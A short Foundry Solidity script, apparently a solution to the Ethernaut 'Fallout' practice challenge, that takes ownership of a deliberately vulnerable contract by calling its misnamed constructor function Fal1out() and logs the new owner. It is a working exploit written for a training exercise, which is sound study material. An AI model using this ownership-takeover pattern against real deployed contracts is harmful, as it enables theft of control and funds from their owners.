// SPDX-License-Identifier: MIT

pragma solidity ^0.6.2;

import { Script, console } from "forge-std/Script.sol";
import { HelperConfig } from "./HelperConfig.s.sol";
import { Fallout } from "../src/02_Fallout.sol";

contract FalloutAttacker is Script {

  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

  function run() external {

    HelperConfig helperConfig = new HelperConfig();
    address payable challengeInstanceAddress = payable(helperConfig.instances("Fallout"));
    Fallout challenge = Fallout(challengeInstanceAddress);

    vm.startBroadcast(deployerPrivateKey);
    
    challenge.Fal1out();
    console.log("Owner: %s", challenge.owner());
    
    vm.stopBroadcast();
  }

}